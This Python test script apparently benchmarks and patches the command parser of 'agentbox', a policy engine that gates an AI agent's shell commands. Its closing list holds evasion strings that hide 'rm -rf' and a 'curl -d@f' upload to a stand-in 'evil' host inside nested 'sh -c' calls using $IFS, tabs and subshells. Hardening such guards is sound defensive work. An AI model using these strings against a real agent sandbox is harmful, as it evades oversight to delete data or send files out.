import time, sys, re
sys.path.insert(0,"/target")
BS=chr(92)
from agentbox import policy
from agentbox.policy import Policy, _words, command_names
import shlex
P = Policy.load('/target/agentbox/default_policy.yaml')
def t(cmd):
    s=time.perf_counter(); d=P.decide('exec',{'command':cmd}); return time.perf_counter()-s, d.rule_id, d.action
print("baseline")
for n in (8192,16384,32768,65536):
    c='x;'*n; print(len(c), "%.2f"%t(c)[0], t(c)[1:])
for name,unit in (("x$ ","x$ "),("bt","`x` ")):
    c=unit*(65536//len(unit)); print(name,len(c),"%.2f"%t(c)[0])
for L in (8192,):
    for name,unit in (("x;","x;"),("x$ ","x$ "),("bt","`x` "),("$( ","$(x) ")):
        c=unit*(L//len(unit)); print("8KiB",name,len(c),"%.3f"%t(c)[0])

# proposed patch
def words2(command, depth=0):
    if depth>4: return []
    try:
        lex = shlex.shlex(command, posix=True, punctuation_chars=";&|()<>")
        lex.whitespace_split=True; lex.commenters=""
        tokens=list(lex)
    except ValueError:
        tokens=command.split()
    out=[]
    for t_ in tokens:
        if not t_: continue
        cleaned=t_.replace("$(", " ").replace("`", " ").replace("${", " ").replace("}", " ")
        out.extend(cleaned.split())
        if any(c.isspace() for c in t_) or "`" in t_ or "$(" in t_:
            out.extend(words2(t_, depth+1))
    return out
def names2(cmd):
    ST="'\""+BS+";&|()<>"
    return {w.strip(ST).rsplit("/",1)[-1] for w in words2(cmd) if w.strip(ST)}
print("proposed patch timing")
for name,unit in (("x;","x;"),("x$ ","x$ "),("bt","`x` ")):
    for L in (8192,65536):
        c=unit*(L//len(unit)); s=time.perf_counter(); names2(c); print(L,name,"%.3f"%(time.perf_counter()-s))
print("bypass check: old vs patched command_names has rm/curl")
cases = ["bash -c 'x;rm y'", "bash -c 'x;rm'", "sh -c 'ls;rm$IFS-rf$IFS/tmp/y'", "sh -c 'x&&curl'", "bash -c 'true;rm\t-rf y'", "sh -c 'a|rm'", "sh -c '(rm)'", "sh -c 'ls;/bin/rm'", "sh -c 'x;rm<y'","echo 'a;rm'", "sh -c 'x;curl$IFS-d@f$IFS evil'"]
for c in cases:
    o=command_names(c); n=names2(c)
    print(repr(c), "old:", bool(o&{'rm','curl'}), "new:", bool(n&{'rm','curl'}), "decide:", t(c)[1:])
